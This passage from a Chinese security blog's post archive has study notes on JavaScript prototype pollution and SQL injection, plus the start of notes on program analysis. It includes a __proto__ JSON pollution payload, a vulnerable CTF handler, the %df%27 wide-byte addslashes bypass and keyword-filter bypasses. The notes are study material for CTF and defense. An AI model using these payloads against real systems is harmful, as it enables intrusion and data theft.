什么是语法分析？</font></p><p>语法分析就是理解抽象语法树（机器上的理解）。有几个比较关键点：</p><ul><li>做什么操作？赋值、加法、减法、调用函数</li><li>变量是哪个？局部变量还是全局变量？需要结合代码的上下文分析。</li><li>细节处理：代码位于xx行？是否类型转换。</li></ul><p>完善抽象语法树的过程，比较复杂。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 计算机基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】JavaScript原型链污染攻击总结</title>
      <link href="a53ac9b162e0/"/>
      <url>a53ac9b162e0/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>原型链污染，是 NodeJs 中常见的漏洞，在做 antCTF 时也遇到的原型链污染题目，在此记录自己学习原型链污染的过程。</p><h1 id="1-原理"><a href="#1-原理" class="headerlink" title="1 原理"></a>1 原理</h1><p><font color="red">0x01 问：原型链有什么作用？</font></p><p>用来做继承，也就是基于原有的代码做一定的修改。下面是一个使用原型链实现继承的案例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.name = <span class="string">&#x27;kevin&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Parent.prototype.getName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="built_in">this</span>.name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child1 = <span class="keyword">new</span> Child();</span><br><span class="line"><span class="built_in">console</span>.log(child1.getName()) <span class="comment">// kevin</span></span><br></pre></td></tr></table></figure><p>当「方法」的 prototype 指定对象原型之后，当试图访问该类的对象属性时，它不仅仅在该对象上搜寻，还会搜寻该对象的原型，以及该对象的原型的原型，依次层层向上搜索，直到找到一个名字匹配的属性或到达原型链的末尾。下面是一个修改 prototype 的案例：</p><blockquote><p>注意：prototype 是「方法特有的」（需要大概了解，后面需要使用到）</p><ul><li>方法：类似 C++ 中的类。除了有属性 <code>__proto__</code>, 还有属性 prototype，prototype 指向该方法的原型对象。propotype 指定其他对象之后，会包含所有原型对象的属性和方法</li><li>对象：类似 C++ 中的对象。对象只有属性 <code>__proto__</code> 指向该对象的构造函数的原型对象。对象有 <code>constructor</code> 里面包含该类的 prototype。</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 让我们从一个函数里创建一个对象o，它自身拥有属性a和b的：</span></span><br><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="built_in">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="built_in">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* 这么写也一样</span></span><br><span class="line"><span class="comment">function f() &#123;</span></span><br><span class="line"><span class="comment">  this.a = 1;</span></span><br><span class="line"><span class="comment">  this.b = 2;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f(); <span class="comment">// &#123;a: 1, b: 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 在f函数的原型上定义属性</span></span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 不要在 f 函数的原型上直接定义 f.prototype = &#123;b:3,c:4&#125;;这样会直接打破原型链</span></span><br><span class="line"><span class="comment">// o.[[Prototype]] 有属性 b 和 c</span></span><br><span class="line"><span class="comment">//  (其实就是 o.__proto__ 或者 o.constructor.prototype)</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] 是 Object.prototype.</span></span><br><span class="line"><span class="comment">// 最后o.[[Prototype]].[[Prototype]].[[Prototype]]是null</span></span><br><span class="line"><span class="comment">// 这就是原型链的末尾，即 null，</span></span><br><span class="line"><span class="comment">// 根据定义，null 就是没有 [[Prototype]]。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 综上，整个原型链如下:</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;a:1, b:2&#125; ---&gt; &#123;b:3, c:4&#125; ---&gt; Object.prototype---&gt; null</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a); <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// a是o的自身属性吗？是的，该属性的值为 1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.b); <span class="comment">// 2</span></span><br><span class="line"><span class="comment">// b是o的自身属性吗？是的，该属性的值为 2</span></span><br><span class="line"><span class="comment">// 原型上也有一个&#x27;b&#x27;属性，但是它不会被访问到。</span></span><br><span class="line"><span class="comment">// 这种情况被称为&quot;属性遮蔽 (property shadowing)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.c); <span class="comment">// 4</span></span><br><span class="line"><span class="comment">// c是o的自身属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// c是o.[[Prototype]]的属性吗？是的，该属性的值为 4</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.d); <span class="comment">// undefined</span></span><br><span class="line"><span class="comment">// d 是 o 的自身属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// d 是 o.[[Prototype]] 的属性吗？不是，那看看它的原型上有没有</span></span><br><span class="line"><span class="comment">// o.[[Prototype]].[[Prototype]] 为 null，停止搜索</span></span><br><span class="line"><span class="comment">// 找不到 d 属性，返回 undefined</span></span><br></pre></td></tr></table></figure><p><font color="red">0x02 问：<code>__proto__</code> 属性有什么作用？</font></p><p>每个「对象」都有 <code>__proto__</code> 属性，指向了创建该对象的构造函数的原型。其实这个属性指向了 [[prototype]]，但是 [[prototype]] 是内部属性，我们并不能访问到，所以使用 <code>__proto__</code> 来访问。</p><blockquote><p>简而言之：用 prototype 无法直接访问，需要使用 <code>__proto__</code> 访问。prototype 是一个指针属性。</p></blockquote><p>这里有个需要区分的概念：</p><ul><li><code>__proto__</code>：指向原型对象的构造器。</li><li><code>constructor</code>：指向当前对象的构造器。</li></ul><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210311120136.png"><br>（图片说明：右下角是图片的说明，左图的<code>__proto__</code>的箭头指向原型对象的构造器）</p><p><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210311120456.png"><br>（图片说明：右下角是图片的说明，左图的<code>constructor</code>的箭头指向原型对象的构造器）</p><hr><p><font color="red">0x03 问：原型链污染的概念是什么？</font></p><p>在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</p><p>基本原理：引用类型的属性被所有实例共享。案例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.names = [<span class="string">&#x27;kevin&#x27;</span>, <span class="string">&#x27;daisy&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Child</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">Child.prototype = <span class="keyword">new</span> Parent();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child1 = <span class="keyword">new</span> Child();</span><br><span class="line">child1.names.push(<span class="string">&#x27;yayu&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(child1.names); <span class="comment">// [&quot;kevin&quot;, &quot;daisy&quot;, &quot;yayu&quot;]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> child2 = <span class="keyword">new</span> Child();</span><br><span class="line"><span class="built_in">console</span>.log(child2.names); <span class="comment">// [&quot;kevin&quot;, &quot;daisy&quot;, &quot;yayu&quot;]</span></span><br></pre></td></tr></table></figure><p>按照 Java 中正常的继承，child2.names 应该和原对象一样，数组中只有 2 个数据。</p><h1 id="2-利用"><a href="#2-利用" class="headerlink" title="2 利用"></a>2 利用</h1><p><font color="red">问：怎么判断是否有原型链污染？</font></p><ul><li>字符串可以被解析为方法或对象。例如：Json.parse 进行解析、shvl 库使用点对属性操作。</li><li>对象的键和值都可控。target[key] = value，其中 key 和 value 均可控制。</li></ul><p>下面是一个原型链污染的简单案例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;merge&#x27;</span>, target, source);</span><br><span class="line">    <span class="comment">// 遍历 source 中的 key。</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;         <span class="comment">// &#123;&#125; 是一个对象，存在 __proto__ 的 key。</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(o1));</span><br><span class="line"><span class="built_in">console</span>.log(o1);    <span class="comment">// object</span></span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(o2));</span><br><span class="line"><span class="built_in">console</span>.log(o2);    <span class="comment">// object</span></span><br><span class="line"></span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;o1 proto:&#x27;</span>, o1.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;o2 proto:&#x27;</span>, o2.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;&#123;&#125; proto:&#x27;</span>, &#123;&#125;.__proto__);</span><br><span class="line"><span class="built_in">console</span>.log(o1, o2);    <span class="comment">// 对象 &#123;&#125; 的原型对象变为 &#123; a: 1 &#125;。</span></span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3)</span><br></pre></td></tr></table></figure><p>实战1:在 antCTF 中，使用 shvl 库对键值进行操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">email: <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> contents = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">Object</span>.keys(req.body).forEach(<span class="function">(<span class="params">key</span>) =&gt;</span> &#123;</span><br><span class="line">      shvl.set(contents, key, req.body[key]);</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="comment">// 遍历请求参数中所有的 key</span></span><br><span class="line">    <span class="comment">// 将键和值赋值为 contents（shvl 库的 set 函数）</span></span><br><span class="line"></span><br><span class="line">    contents.from = <span class="string">&#x27;&quot;admin&quot; &lt;admin@8-bit.pub&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">await</span> send(contents);</span><br><span class="line">      <span class="keyword">return</span> res.json(&#123;</span><br><span class="line">        message: <span class="string">&quot;Success.&quot;</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> res.status(<span class="number">500</span>).json(&#123;</span><br><span class="line">        message: err.message</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><font color="red">问：常见的原型链污染方法有哪些？</font></p><ul><li><code>function.__proto__.polluted</code>。</li><li><code>function.prototype.polluted</code>。</li><li><code>obj.__proto__.pollluted</code>。例如：shvl 只禁用了 <code>__proto__</code>，传送门<a href="https://github.com/robinvdvleuten/shvl/pull/35">Security Fix for Prototype Pollution - huntr.dev</a></li><li><code>obj.constructor.polluted</code>。</li></ul><p>案例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">fullName</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.fullName = fullName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> person1 = <span class="keyword">new</span> person(<span class="string">&quot;Satoshi&quot;</span>);</span><br><span class="line"><span class="comment">// function：prototype, __prototype</span></span><br><span class="line">person.prototype.sayHello = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__);</span><br><span class="line">person.prototype.newConstant = <span class="number">2</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__); </span><br><span class="line"></span><br><span class="line"><span class="comment">// object: __prototype__, constructor</span></span><br><span class="line">person1.__proto__.sayHi= <span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__);</span><br><span class="line">person1.constructor.prototype.oldConstant = <span class="number">4</span></span><br><span class="line"><span class="built_in">console</span>.log(person1.__proto__);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">person &#123; sayHello: 1 &#125;</span></span><br><span class="line"><span class="comment">person &#123; sayHello: 1, newConstant: 2 &#125;</span></span><br><span class="line"><span class="comment">person &#123; sayHello: 1, newConstant: 2, sayHi: 3 &#125;</span></span><br><span class="line"><span class="comment">person &#123; sayHello: 1, newConstant: 2, sayHi: 3, oldConstant: 4 &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><blockquote><p>推荐一个非常 nice 的网站：<a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a> 。收集 hack 中的 tricks</p></blockquote><hr><p><font color="red">问：原型链污染链怎么挖掘？</font></p><ol><li>寻找 JavaScript 中的危险关键字（危险函数）。如：<ol><li>模块：child_process</li><li>函数：eval, spwn, exec, setTimeout, setInteval, Function</li></ol></li><li>寻找调用关系，并且确定可控的参数。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/20210313142208.png"><br>（图片说明：先确认危险函数和调用方式，也就是头部和尾部，再去寻找中间过程）</li><li>充分利用危险函数和能控制的参数。（读取文件或者反弹 shell）</li></ol><ul><li>目标机器环境如果有 bash，可以反弹 shell。</li><li>目标机器环境如果有 Python 等，可以反弹 shell。</li><li>目标机器环境如果只有 sh，将 readflag 执行写入到其他地方，再利用其他方式读取。</li></ul><p>（拓展阅读：<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">反弹Shell表</a>）</p><p><font color="red">问：原型链污染怎么防御？怎么绕过防御呢？</font></p><ul><li>如果系统中有键值的操作，并且键和值来自外部输入。可以考虑进行过滤：<ul><li>禁止操作 <code>constructor</code></li><li>禁止操作 <code>prototype</code></li><li>禁止操作 <code>__proto__</code></li></ul></li></ul><p>绕过防御：</p><ul><li>思考并测试是否过滤完全，具体参考 antCTF 的 8-bit-pub 中的 shvl 库绕过。</li></ul><p>参考教程：</p><ol><li><a href="https://github.com/mqyqingfeng/Blog/issues/16">JavaScript深入之继承的多种方式和优缺点-Github</a></li><li><a href="https://www.huaweicloud.com/articles/588bbccfd343112b66fba197a74dd245.html">JS中的prototype、__proto__与constructor-Huawei</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain#%E5%9F%BA%E4%BA%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%9A%84%E7%BB%A7%E6%89%BF">继承与原型链 - JavaScript | MDN</a></li><li><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">深入理解 JavaScript Prototype 污染攻击-phithon</a></li><li><a href="https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution#basic-example">NodeJS - <strong>proto</strong> &amp; prototype Pollution-HackTricks</a></li><li><a href="https://zhuanlan.zhihu.com/p/355840263">AntCTF2021部分WP-HapHp1</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 网络空间安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Javascript </tag>
            
            <tag> 原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】SQL注入总结</title>
      <link href="d3de666e8195/"/>
      <url>d3de666e8195/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>SQL 注入是一种常见的通用漏洞，在 CTF 中也是常客。</p><blockquote><p>我对于通用漏洞的理解：和任何框架没有关系，和任何语言没有关系。</p></blockquote><p>曾经做完 sqli-lab 的我非常的天真，想尝试把 SQL 注入漏洞进行系统性的总结归档，我发现，这真的太难太难了。</p><p>所以就有了现在这篇文章，采用问答的方式，记录一些自己遇到和收集的 SQL 注入的思想，让自己能在遇到具体问题时进行具体的分析。</p><hr><h1 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1 基本原理"></a>1 基本原理</h1><p>将用户输入的参数当作 SQL 语句执行。</p><blockquote><p>更好的解释：用户输入的参数可以改变 SQL 的语法或语义。</p></blockquote><h1 id="2-防御与利用"><a href="#2-防御与利用" class="headerlink" title="2 防御与利用"></a>2 防御与利用</h1><blockquote><p>攻与防不能独立的看待，需要根据实际的问题去解决。例如：使用 addslashes 能防御 SQL 注入，但是在某些特殊情况又可以进行绕过（如：宽字节注入、数组注入），但是用一些简单的方法又能防御掉这些绕过（如：set UTF-8、类型检查）。</p></blockquote><hr><p><font color="red">问：如何检测 SQL 注入？</font></p><p>无源码：</p><ol><li>使用 SQLmap 跑一下。</li><li>使用常见的<a href="https://slug01sh.github.io/2021%E5%B9%B41%E6%9C%8818%E6%97%A5-sql%E6%B3%A8%E5%85%A5%E9%80%9F%E6%9F%A5%E6%89%8B%E5%86%8C%EF%BC%88%E4%B8%8D%E5%AE%9A%E6%9C%9F%E6%9B%B4%E6%96%B0%EF%BC%89/#2-%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F">闭合方式</a> fuzz 一下。</li><li>手动闭合？不推荐，测试不完全。</li></ol><p>有源码：</p><ol><li>中型代码<ol><li>查看 SQL 语句编写是否规范（具体请查看后文的防御方式）。如：</li><li>查看官方文档是否有自动类型转换，构造数组或其他数据类型绕过。如：<a href="">AntCTF 8-bit-pub</a></li></ol></li><li>小型代码：搜集 tricks，逐个分析以及测试。</li></ol><hr><p><font color="red">问：怎么绕过 addslashes？</font></p><ol><li>利用宽字节注入。（正常运行函数）</li></ol><ul><li>条件：MySQL 的编码为 GBK。</li><li>原理：PHP 对字符的编码为 UTF-8，<code>%27</code> 为 <code>&#39;</code>，<code>%5c</code> 为反斜杠，<code>%df</code> 无字符。当给 PHP 发送 <code>%df%27</code> 时，PHP 会将引号进行转义，转义为 <code>%df%5c%27</code>。经过转义后的字符在 UTF-8 下是安全的，但是在 GBK 中 <code>%df%5c</code> 会转义为 <code>運</code> 字，而引号并没有被转义。</li><li>修复：（参考：<a href="https://www.leavesongs.com/PENETRATION/mutibyte-sql-inject.html#004">浅析白盒审计中的字符编码及SQL注入-PHITHON</a>）<ul><li>调用一下 mysql_set_charset 函数，设置当前连接的字符集为 GBK。使用 mysql_real_escape_string 进一步过滤。</li><li>设置 GBK 之后，设置 character_set_client=BINARY。</li><li>使用 PDO（PHP Data Object）。如果 PHP &lt; 3.6，禁用 PHP 仿真预编译。</li></ul></li></ul><ol start="2"><li>利用特殊类型进行绕过（不正常运行函数）</li></ol><ul><li>条件：能控制传入参数的数据类型。$_GET[“a”] 可能为数组。</li><li>原理：addslashes 只能处理字符串</li></ul><hr><p><font color="red">问：SQL 注入有哪些利用方法？</font></p><p>基本功能：</p><ol><li>任意账户登陆。（有些转义函数可能无法实现完全可控，例如：antCTF的8-bit-pub）。</li><li>数据库读取。</li></ol><p>进阶功能：</p><ol><li>系统文件读取。</li><li>系统文件写入，即写 Webshell。</li><li>执行命令。</li></ol><hr><p><font color="red">问：过滤关键字如何绕过？</font></p><p>方法1:双写绕过</p><ul><li>条件：将过滤字符删除，只删除一次（没有进行递归删除）。</li><li>原理：删除之后的字符串可以形成新的关键字 an<code>and</code>d。</li></ul><p>方法2:大小写绕过</p><ul><li>条件：使用正则表达式进行匹配，但是没有使用 <code>/i</code></li><li>原理：大部分数据库对大小写不敏感。</li></ul><hr><p><font color="red">问：在数据库的报错信息中，如何显示自己需要的字符串？</font></p><blockquote><p>2020 年 n1ctf 中 Web-SignIn 一题中用到</p></blockquote><ul><li>exp()函数</li></ul><hr><p><font color="red">问：在做白盒审计时，如何快速定位是否存在 SQL 注入？</font></p><ul><li>全局搜索关键字：select、query、db、sql等。<ul><li>宽字节注入：GBK</li><li>二次 urldecode 注入：urldecode, rawurldecode</li></ul></li><li>查看所使用的库文档，找文档的 escape。</li></ul><hr><p><font color="red">问：常见的 SQL 注入的防御方法有哪些？</font></p><ol><li>GPC/runtime 函数过滤（部分防御 SQL 注入，具体参考《代码审计》一书）。<ol><li>GPC 负责对 GET，POST，Cookie 过滤。</li><li>runtime 负责对文件过滤。</li></ol></li><li>过滤函数和类<ol><li>addslashes 函数（addslashes 不知道任何有关 MySQL连接 的字符集，转义后更有可能导致错误）</li><li>mysql_real_escape_string 函数</li><li>intval 函数</li></ol></li><li>PDO 预编译</li></ol><hr><p><font color="red">问：预编译的方法怎么绕过？</font></p><p>方法1:</p><ul><li>条件：将用户输入的参数直接写入预编译语句。</li><li>原理：预编译是数据库提供的功能，分为 prepare 和 execute。prepare 是将需要执行的语句（不带数据）发送数据库，数据库进行词法分析、语法分析、语义分析，固定执行的具体流程。execute 将数据发送给数据库，发送的数据只能被作为字符串处理，无法改变 SQL 语句的执行流程。</li></ul><p>方法2:</p><ul><li>条件：模拟预编译。</li><li>原理：PHP 的模拟预编译的实质是转义，也就是调用 <code>mysql_real_escape_string</code> 函数进行转义。</li></ul><hr>]]></content>
      
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【网络安全系列】程序分析总结</title>
      <link href="016f20c17d1b/"/>
      <url>016f20c17d1b/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0 前言"></a>0 前言</h1><p>前几天面试阿里的 SDL 部门，面试小姐姐人非常好。大致给我讲了里面工作的大致分类。</p><ul><li>白盒审计：</li><li>黑盒测试</li></ul><p>我也基本确定了自己的发展方向，CTF 的内容也偏向于这方面，以后的主要学习内容都尽量偏向于这两个方向。</p><blockquote><p>我深知，技术是为了解决问题而生，各种各样的技术会不断进步，永远是学不完的。我需要积淀自己的核心能力。</p></blockquote><p>后面的内容是学习了南京大学的《软件分析》课程之后，思考总结的笔记。</p><h1 id="1-第一课"><a href="#1-第一课" class="headerlink" title="1 第一课"></a>1 第一课</h1><p><font color="red">0x01 Program Language、编译原理、程序分析、静态分析、动态分析的关系是什么？</font></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">graph TD;</span><br><span class="line">    classDef default fill: orange;</span><br><span class="line">    id1(Program Language);</span><br><span class="line">    id2(编译原理);</span><br><span class="line">    id3(程序分析);</span><br><span class="line">    id4(静态分析);</span><br><span class="line">    id5(动态分析);</span><br><span class="line">    id1--&gt;id2 &amp; id3;</span><br><span class="line">    id2--&gt;id4</span><br><span class="line">    id3--&gt;id4 &amp; id5;</span><br></pre></td></tr></table></figure><p>（图片说明：也就是说程序分析和编译原理都处于 PL 的一个小分支，编译原理更偏向于静态分析）</p><ul><li>PL：即 Program Language，是研究编程语言的一个领域，编译原理和程序分析都只是其中的研究方向。</li><li>编译原理：高级编程语言翻译成机器代码的科学技术。</li><li>程序分析：自动分析程序的包括正确性、健壮性、安全性和活跃性等特征的过程。</li><li>静态分析：在代码未运行时，进行代码特征分析的方法。在编译原理中会使用到静态词法分析、语法分析、语义分析。</li><li>动态分析：在代码执行时，进行分析。</li></ul><p><font color="red">0x02 soundness（稳健）、completeness（完整）、false negatives（假阴性、漏报率）、false positives（假阳性、错报率）</font></p><p>soundness 和 completeness 都是用来描述程序分析最后结果的形容词。</p><ul><li>soundness 代表把所有的异常都找到，但是有假阴性。</li><li>completeness 代表找到的异常都是真实存在的，但是有些异常没有找到</li></ul><p>soundness 和 completeness 也就有了不同的衡量指标：</p><ul><li>假阴性（漏报率）：只要感染病毒，核酸检测就应该是阳性；如果检查是阴性，就说明没有感染新冠肺炎。 然而，事实并不是这样的。 一些患者是新型冠状病毒感染者，但是核酸检测报告阴性，我们把这种情况称之为“假阴性”。只会存在于 soundness。</li><li>假阳性（错报率）：没患病但是检测出来患病，就是假阳性。只会用来描述 completeness。</li></ul><p>单从「漏」和「错」来看，我会认为错报率更严重，但实际来看漏洞才是最危险的，「漏报」就很容易导致进一步导致病毒进一步传播，对于程序分析亦是如此，「漏报」就有更大的概率导致出现安全隐患。</p><p>我们在研究的时候，通常是先保证 soundness，然后在 soundness 